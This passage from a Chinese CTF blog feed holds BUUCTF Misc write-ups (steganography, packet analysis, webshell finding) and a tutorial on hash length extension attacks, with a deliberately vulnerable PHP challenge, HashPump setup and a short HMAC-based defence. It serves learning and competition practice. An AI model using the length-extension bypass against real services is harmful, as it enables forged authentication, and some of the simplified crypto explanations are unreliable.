<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>下载下来一个bin文件，实在不知道这个文件的正确打开方式，百度了下大佬的思路，大佬直接就说这是路由器数据，用 <strong>RouterPassView</strong> 可以查看该文件内容emmm，又get一个新工具，username的值即为flag</p>
<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p><del>下载下来一个路飞的图片，winhex查看发现有两张jpg，把第二张jpg拿出来</del><br>一开始一直以为flag会放在藏起来的大图片里，结果发现这里被惯性思维坑了，flag就在原图里，winhex搜素flag或者kali里用strings输出可见字符查看flag都能看到flag，flag后面跟了一串base64字符，解码即可</p>
<h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>音频分析软件拉进去，发现双声道，一个是莫斯码，一个是音频，直接解码莫斯码</p>
<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>解压网站文件后，360自动扫描提示后门文件emmm，被360秀了2333，include.php就是后门脚本，打开即可看到 密码（md5）</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>爆破工具破解压缩包，拿到文本，是brain fuck代码，用工具执行，输出flag</p>
<h2 id="梅花香自苦寒来"><a href="#梅花香自苦寒来" class="headerlink" title="梅花香自苦寒来"></a>梅花香自苦寒来</h2><p>解包是一个jpg，老规矩winhex看结尾，发现一大串十六进制数据，猜测是把文件的十六进制作为文本的形式写在后面了，提取出来写个脚本将其作为文件十六进制解码，拿到二维码，扫码出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">outfile_hex = <span class="built_in">open</span>(<span class="string">&#x27;outfile_hex.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">file_out = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(outfile_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">271</span>,<span class="number">271</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fi.readlines():</span><br><span class="line">        flag = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">eval</span>(flag[<span class="number">0</span>][<span class="number">1</span>:])</span><br><span class="line">        y = <span class="built_in">eval</span>(flag[<span class="number">1</span>][<span class="number">0</span>:-<span class="number">2</span>])</span><br><span class="line">        <span class="comment">##print(x,y)</span></span><br><span class="line">        pic.putpixel([x-<span class="number">1</span>,y-<span class="number">1</span>],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"><span class="comment">##file_out.close()</span></span><br></pre></td></tr></table></figure>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>jpg文件结尾有压缩包，解包拿到两个文件，key中是base64编码，解码拿到提示<code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code>，百度歌手<code>Nicki Minaj</code>,从她的歌中找和蛇相关的，发现<code>anaconda</code>；之后再去找加密算法，因为除了密钥的提示之外没有其他提示，所以推测加密算法的名字有可能也和蛇相关，查找蛇的单词发现 <code>serpent</code>作为蛇的翻译刚好是一个加密算法的名字，找了一个在线解密网站，解出flag</p>
<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>下载下来一个加密压缩包，没有别的提示，猜测是伪加密，试了一下，解压成功，第二个加密压缩包是真加密，觉得密码应该在解压拿到的图片里，jpg图片加密，把手里能使的全整了一遍，最后用<code>steghide</code>拿到隐藏的txt文件，<code>steghide</code>加密密钥为空。txt里即是flag的加密密码，解压得flag</p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>下载下来一个jpg,winhex查看发现一个压缩包，提取出来有加密，猜测是伪加密，尝试之后解压出来一个<strong>vmdk</strong>。这里查了好久的资料，没查到为什么 <code>vmdk</code> 可以用 <code>7z</code> 解压缩从而获取硬盘内的数据，暂放。<strong>7z</strong>解压出来两个文件夹，第一个里面是<code>brain fuck</code>代码，用<strong>brainfucktool</strong>运行拿到一半flag，第二个文件夹里面只有一句话：这里没有flag，用<code>7z</code>打开vmdk，发现第二个文件夹有交替数据流， 用<strong>ntfs文件系统</strong> 隐写工具 <code>ntfsstreamseditor</code> 查看发现隐藏的<code>Ook!</code>代码，用在线工具解出第二段flag</p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>杀毒软件先扫一遍，发现风险项，ok，进去找<strong>密码（md5）</strong></p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>wireshark打开，分析http流量，找到一个图片的base64码，复制出来，写个脚本解base64保存为文件,用图片查看器看图，看到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    lines = fi.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> io:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            decode_str = base64.b64decode(line)</span><br><span class="line">            io.write(decode_str)</span><br></pre></td></tr></table></figure>
<h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>wireshark分析http流量，发现有一个login的http，追踪看到 <strong>name</strong> 和 <strong>word</strong> ，用在线网站转一下32位小写md5即可</p>
<h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>题目提示刷新键，刷新键是 <strong>f5</strong> ，由此知道是<code>f5</code>隐写，尝试后知道没有密码，输出的文本打开后发现是压缩包，修改文件后缀发现被加密了，猜测是伪加密，得到flag.txt</p>
<h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>wireshark分析，因为考虑和菜刀有关，所以只看http数据中传有base64字符串的数据流，发现用户用十六进制裸传了一张jpg图片，并下载了一个zip包。<br>将图片十六进制复制出来重新转为图片（这里我转的图片内容是色块没有任何其他信息，百度wp大佬们转出来的是一个带密码的屏幕截图）；<br>zip提取出来后发现有密码，<del>考虑到前面的图片没有有用信息怀疑又是伪加密</del>，发现不是，无奈去百度了wp发现前面的图片转出来应该是正常的图片，晕，这个没办法了，然后解包拿到flag</p>
<h2 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h2><p>是我的打开方式不对嘛，这题我当简单逆向做的。<br>ida打开搜索字符串看到 <code>well done</code> ，跟进找到main函数，反汇编查看伪C源码，flag几乎给全了，就是要自己手动补一截。盲猜补个123。百度一下函数<code>atoi</code>，发现这是c语言里用来把字符串转为对应整数的函数，if判断要求转化之后的十六进制为<code>0x7A</code>，后门跟三个字符分别为xyz，0x7a转为十进制是122，即输入应为<code>122xyz</code>，运行程序输入122xyz，发现flag和盲猜的一样emmm</p>
<h2 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h2><p>wireshark查看流量包发现是一个<code>bool盲注</code>的全过程，那就好办了，直接导出 <strong>http对象</strong> ，接下来可以人眼扫描注入过程分析flag，也可以写脚本判断诸如过程分析flag，身为 <strong>头铁萌新</strong> 代表，我果断选择人眼扫诸如过程，手工提取flag的ASCII码然后转换字符串嘿嘿嘿<br><del>好吧其实我就是懒得去写python脚本了</del> 2333</p>
<h2 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h2><p>解压拿到一个png图片，心累，终于让我遇到一个 <strong>lsb隐写</strong> 了嘛！！！果断 <code>zsteg -a</code> 我今天就把你lsb得骨灰给你扬了嘿嘿嘿。发现<code>BGR</code>模式下lsb藏了一张png，提取出来发现只有半张二维码，试试修改图片高度，获取完整二维码，是一个百度网盘链接。拿到一个flag压缩包，用WinRAR解压发现提示无法设置安全数据，猜测有可能是ntfs隐写，WinRAR可以对隐藏有ntfs数据流的文件进行压缩与解压缩并且不影响其所隐藏的数据，之前查ntfs隐写相关资料的时候记得是这么说的。用 <code>ntfsstreamseditor</code> 就可以拿到隐藏文件。然后拿到flag.pyc，用工具反编译成 <strong>py脚本</strong> 即可。附带<a href="https://www.ximu.xyz/2019/10/30/re-python/">简单python逆向基础</a>。读加密脚本由结果反向推导flag。解密函数如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">ciphertext</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">int</span>(ciphertext[-i-<span class="number">1</span>]) - <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">int</span>(ciphertext[-i-<span class="number">1</span>]) + <span class="number">10</span></span><br><span class="line">        s = i ^ s</span><br><span class="line">        flag+=<span class="built_in">chr</span>(s)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h2><p>音频分析，莫斯码，淦，想要个莫斯码提取工具QAQ，我只会手工，丢</p>
<h2 id="请看篇章二"><a href="#请看篇章二" class="headerlink" title="请看篇章二"></a><a href="http://xibai.xyz/2020/02/02/BUU-Misc-two/">请看篇章二</a></h2>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash长度扩展攻击</title>
    <url>/2019/11/20/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="浅谈简单Hash算法"><a href="#浅谈简单Hash算法" class="headerlink" title="浅谈简单Hash算法"></a>浅谈简单Hash算法</h1><p>hash算法的经典代表<strong>md5</strong>、<strong>sha1</strong>。其在进行Hash值运算时，会根据计算对象的数据长度进行分组，之后对分组后的数据一组一组地进行迭代运算。</p>
<h2 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h2><h3 id="长度分组"><a href="#长度分组" class="headerlink" title="长度分组"></a>长度分组</h3><p>将目标对象的数据长度转化为<strong>16进制数据</strong>或者<strong>二进制数据</strong>，<strong>若按16进制数据计算</strong>，则每<strong>56Bytes</strong>为一组，不足<strong>56bytes</strong>则对其进行填充——以16进制<code>0x80</code>为首填充字节，后跟<code>0x00</code>，直到该组数据长度被填充到<strong>56bytes</strong>停下；然后在<strong>每一组56字节的数据后再加八个字节</strong>——该八个字节为<strong>该组数据未填充前</strong>的 <strong>bit</strong> 长度，即<code>len(该组原数据) * 8 bit</code></p>
<h3 id="迭代运算"><a href="#迭代运算" class="headerlink" title="迭代运算"></a>迭代运算</h3><p>分组完成后，就会得到<strong>一组组</strong>长度为<strong>64bytes</strong>的数据，以此为基础，hash散列算法会以每组数据为基础进行每一轮的运算。这里<strong>因为没有学习hash散列算法</strong>的实现，<strong>不清楚其运算的过程</strong>，故以<code>hash_process(data[i])</code> 代表每轮的运算过程。<code>data[i]</code> 为分组后的数据，一次用一组。</p>
<p>hash散列函数内置有一个初始数据 <code>seed</code> ，每一轮 <code>hash_process</code> 的运算都会更新该seed——每一轮运算的结果都会覆盖上一个 <code>seed</code> 的值，最后一个 <code>seed</code> 的值进行一次自身的位置置换即为最终的hash值</p>
<p>如此，hash的运算可以用如下代码片段表示：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> seed=xxxx;</span><br><span class="line"><span class="keyword">int</span> data[k]=&#123;xxxx&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">    seed=<span class="built_in">hash_process</span>(data[i],seed)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">seed 自身数值位置置换</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">hash值=seed</span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>比方说我们对<code>xibai</code>这个字符串进行<code>md5</code>的运算:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&#x27;xibai&#x27;</span>)=<span class="number">5</span>  <span class="comment">#所以填充(56-5)=51个字节，填充后为：</span></span><br><span class="line"><span class="string">&#x27;xibai&#x27;</span>+<span class="string">&#x27;\x80&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">50</span>   <span class="comment">#然后加上八字节的原数据bit长度记录，len(&#x27;xibai&#x27;)*8=40=0x28</span></span><br><span class="line"><span class="comment">#此时该组数据为：</span></span><br><span class="line"><span class="string">&#x27;xibai&#x27;</span>+<span class="string">&#x27;\x80&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">50</span>+<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x28&#x27;</span></span><br><span class="line"><span class="comment">#如此是为一组，然后将其与内置的初始seed进行运算，得到新的seed值</span></span><br><span class="line">seed=hash_process(data[<span class="number">0</span>],seed)</span><br></pre></td></tr></table></figure>
<h2 id="加盐-salt"><a href="#加盐-salt" class="headerlink" title="加盐(+salt)"></a>加盐(+salt)</h2><p>所谓加盐的hash，即在原始数据前面加上一串n字节的数据。</p>
<p>这么一来，加盐的hash计算可以用一下代码来表示其简单流程：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> seed=xxxx;</span><br><span class="line"><span class="keyword">int</span> salt=xxxx;</span><br><span class="line"><span class="keyword">int</span> data[k]=&#123;xxxx&#125;;  <span class="comment">//其中data[0]=&#x27;salt+原第一组数据&#x27;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">    seed=<span class="built_in">hash_process</span>(data[i],seed)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">seed 自身数值位置置换</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">hash值=seed</span><br></pre></td></tr></table></figure>
<p>一般而言salt是随机生成的一串数据，保存在 <strong>其</strong> 本地。</p>
<h1 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h1><p>由以上分析，我们可以发现，当用户可以获取服务器运算后的hash值时，即便服务器本地有一个我们所不知道的 <code>salt</code> ，我们也有机会控制服务器的hash运算结果。</p>
<h2 id="在本地-计算-服务器的hash运算结果"><a href="#在本地-计算-服务器的hash运算结果" class="headerlink" title="在本地 计算 服务器的hash运算结果"></a>在本地 计算 服务器的hash运算结果</h2><p>由以上分析我们可以知道，服务器采用加盐哈希时，如果我们能拿到服务器用 <code>salt</code> 加 我们的输入所计算的hash值时，我们就可以<strong>猜测salt的长度</strong>来进行hash长度扩展攻击。</p>
<p>而在ctf中，salt的长度往往会给出，此时，我们拥有salt的长度、我们自己的输入、服务器运算出的hash值。</p>
<p>如此一来我们可以控制我们的输入来控制服务器的hash值运算，如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务器</span></span><br><span class="line"><span class="keyword">int</span> seed=xxxx;</span><br><span class="line"><span class="keyword">int</span> salt=xxxx;</span><br><span class="line"><span class="keyword">int</span> str=<span class="string">&#x27;输入&#x27;</span>;  <span class="comment">//输入等于&#x27;a&#x27;*(56-salt.length)</span></span><br><span class="line"><span class="keyword">int</span> data[k]= 分组（salt+str）;</span><br><span class="line"><span class="comment">//通过hash的分组规则可知，data数据为一组：&#x27;salt&#x27;+&#x27;a&#x27;*(56-salt.length)+&#x27;\x00&#x27;*6+&#x27;\x0200&#x27;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">    seed=<span class="built_in">hash_process</span>(data[i],seed)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">seed 自身数值位置置换</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">hash值=seed;</span><br></pre></td></tr></table></figure>
<p>此时我们就获取了第一组数据长度为56字节时的hash值，此刻若我们再多输入一些字符，如 <code>xibai</code>，服务器的计算会变成如下所示：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> seed=xxxx;</span><br><span class="line"><span class="keyword">int</span> salt=xxxx;</span><br><span class="line"><span class="keyword">int</span> str=<span class="string">&#x27;输入&#x27;</span>;</span><br><span class="line"><span class="keyword">int</span> data[k]= 分组（salt+str）;</span><br><span class="line"><span class="comment">//因为我们是基于上面的输入多输入了五个字符，所以这次分组后的data为两组</span></span><br><span class="line"><span class="comment">//第一组显然和上面是一样的</span></span><br><span class="line"><span class="comment">//第二组则为&#x27;xibai&#x27;+&#x27;\x80&#x27;+&#x27;\x00&#x27;*57+&#x27;\x28&#x27;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">    seed=<span class="built_in">hash_process</span>(data[i],seed)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时可以发现，第一组数据一样时，其第一轮运算的结果显然也是一样的，而第二轮的计算则是基于第一轮得到的seed进行的</span></span><br><span class="line"><span class="comment">//若我们在本地直接用第一轮的seed来进行后续的计算，如此就可得到服务器本地所计算出来的hash值</span></span><br><span class="line"><span class="comment">//从而以此去通过服务器的hash验证，使其可以对我们的输入执行之后的指令</span></span><br></pre></td></tr></table></figure>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;XXXXXXXXXXXXXXX&quot;</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">setcookie(<span class="string">&quot;sample-hash&quot;</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">&quot;source&quot;</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以实验吧的一道web题为例，我们知道了 <strong>secret+”adminadmin“</strong> 的md5值，并且我们知道secret的长度为15，</p>
<p>这样我们就可以在本地计算出输出长度大于41后的md5值，通过输入长度扩展，从而控制最终的md5值，达到绕过攻击的目的。</p>
<p>这里推荐一个工具 <strong>HashPump</strong></p>
<p>kali里安装hashpump：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev #kali</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/20190422102905998.png" alt="img"> </p>
<p>本题中使用HashPump的各个参数解释如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Input Signature 为COOKIES中hsh的值</span><br><span class="line">Input Data 为用户名</span><br><span class="line">Input Key Length 为长度</span><br><span class="line">Input Data to Add 为密码（自定义，除了admin）</span><br></pre></td></tr></table></figure>
<h1 id="预防Hash扩展攻击"><a href="#预防Hash扩展攻击" class="headerlink" title="预防Hash扩展攻击"></a>预防Hash扩展攻击</h1><p>解决这个漏洞的办法是使用<a href="https://en.wikipedia.org/wiki/HMAC">HMAC</a>算法。该算法大概来说是这样 ：<strong>Hash值 =<br>hash(salt + hash(salt + 输入))</strong>，而不是简单的直接对输入进行一次这种加盐hash运算。</p>
<p>具体HMAC的工作原理有些复杂，但你可以有个大概的了解。重点是，由于这种算法进行了双重摘要，密钥不再受本文中的长度扩展攻击影响。HMAC最先是在1996年被发表，之后几乎被添加到每一种编程语言的标准函数库中。</p>
<p>或者也可以使用 <strong>hash值=hash（输入+slat）</strong> 也可以起到预防的效果，因为这样一来，salt的位置不再固定，就无法进行hash值的准确预测。��</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-MISC(四)</title>
    <url>/2021/04/19/BUU-Misc-four/</url>
    <content><![CDATA[<p><strong>最近更新：</strong> <em>2021-04-19 12:28</em></p>
<h2 id="MRCTF2020-pyFlag"><a href="#MRCTF2020-pyFlag" class="headerlink" title="[MRCTF2020]pyFlag"></a>[MRCTF2020]pyFlag</h2><p>三张图片末尾各有一部分压缩包的数据，提取拼接，是一个加密压缩包，爆破一下得到密码。<br>然后是base套餐，85-&gt;16-&gt;32-&gt;16-&gt;64</p>
<h2 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h2><p>百度一下，得知是慢扫描电视，无线电题目。<br>kali里面手动安装一个<code>QSSTV</code>，设置一下从文件解析<code>Options</code>-&gt;<code>Configuration</code>-&gt;<code>Sound</code>勾选<code>From file</code><br>然后解析一下即可看到flag图片</p>
<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p>日常末尾压缩包，解压是一个elf，拖进ida直接看到flag</p>
<h2 id="UTCTF2020-spectogram"><a href="#UTCTF2020-spectogram" class="headerlink" title="[UTCTF2020]spectogram"></a>[UTCTF2020]spectogram</h2><p>查看频谱图即可</p>
<h2 id="watevrCTF-2019-Evil-Cuteness"><a href="#watevrCTF-2019-Evil-Cuteness" class="headerlink" title="[watevrCTF 2019]Evil Cuteness"></a>[watevrCTF 2019]Evil Cuteness</h2><p>末尾压缩包，解压缩，文本打开</p>
<h2 id="RCTF2019-disk"><a href="#RCTF2019-disk" class="headerlink" title="[RCTF2019]disk"></a>[RCTF2019]disk</h2><p>直接用<code>DiskGenius</code>查看vmdk会提示文件错误，winhex查看发现中间有一大块空间被写满了第一部分的flag。<br>用7z可以提取出<code>fat</code>文件，fat文件可以用<code>VeraCrypt</code>挂载，但是需要密码，印象中rctf当时应该给了一个密码，忘记有没有了<br>VeraCrypt: <a href="https://sourceforge.net/projects/veracrypt/">https://sourceforge.net/projects/veracrypt/</a><br>就当没有吧，那这里就是一个小脑洞了，弱口令猜解，需要去猜到密码：rctf<br>然后挂载拿到第二个密码，VeraCrypt在挂载文件系统的时候，可以用不同的密码进入不同的系统，所以用第二个密码再一次挂载，挂在之后打开提示新的硬盘分区错误，用<code>DiskGenius</code>直接查看，发现这个文件系统被暴力写满了第二部分flag</p>
<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到</p>
<h2 id="MRCTF2020-小O的考研复试"><a href="#MRCTF2020-小O的考研复试" class="headerlink" title="[MRCTF2020]小O的考研复试"></a>[MRCTF2020]小O的考研复试</h2><p>简单的。。。是叫同余式吧，忘记了，前年学的数论，定义和学术用语记不住了，总之是这个意思应该。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19260816</span>):</span><br><span class="line">    a = a * <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">    a%=(<span class="number">1e9</span>+<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<h2 id="BSidesSF2019-table-tennis"><a href="#BSidesSF2019-table-tennis" class="headerlink" title="[BSidesSF2019]table-tennis"></a>[BSidesSF2019]table-tennis</h2><p>ICMP包末尾包含了一个html，把它提取出来得到一个base64编码，解码得flag</p>
<h2 id="INSHack2019-INSAnity"><a href="#INSHack2019-INSAnity" class="headerlink" title="[INSHack2019]INSAnity"></a>[INSHack2019]INSAnity</h2><p>签到</p>
<h2 id="INSHack2019-Sanity"><a href="#INSHack2019-Sanity" class="headerlink" title="[INSHack2019]Sanity"></a>[INSHack2019]Sanity</h2><p>一个ctf三个签到emmm</p>
<h2 id="INSHack2017-insanity"><a href="#INSHack2017-insanity" class="headerlink" title="[INSHack2017]insanity"></a>[INSHack2017]insanity</h2><p>继续签到</p>
<h2 id="CFI-CTF-2018-webLogon-capture"><a href="#CFI-CTF-2018-webLogon-capture" class="headerlink" title="[CFI-CTF 2018]webLogon capture"></a>[CFI-CTF 2018]webLogon capture</h2><p>追踪唯一一个http流量，把流量包里得password解url编码即可</p>
<h2 id="很好的色彩呃？"><a href="#很好的色彩呃？" class="headerlink" title="很好的色彩呃？"></a>很好的色彩呃？</h2><p>色号转flag系列：找个拾色器查一下十六进制色号，发现六个颜色最后两位不一样，转一下ascii码即可</p>
<h2 id="GUET-CTF2019-520的暗示"><a href="#GUET-CTF2019-520的暗示" class="headerlink" title="[GUET-CTF2019]520的暗示"></a>[GUET-CTF2019]520的暗示</h2><p>winhex查看<code>photo.dat</code>，很明显是一个和<code>0x33</code>异或的<code>jpg</code>，写个脚本异或回去。<br>然后发现图片是<code>LTE</code>信息，利用这些信息可以定位到基站位置。<br>推荐网站:<a href="http://www.cellocation.com/">http://www.cellocation.com/</a><br>flag{桂林电子科技大学花江校区}</p>
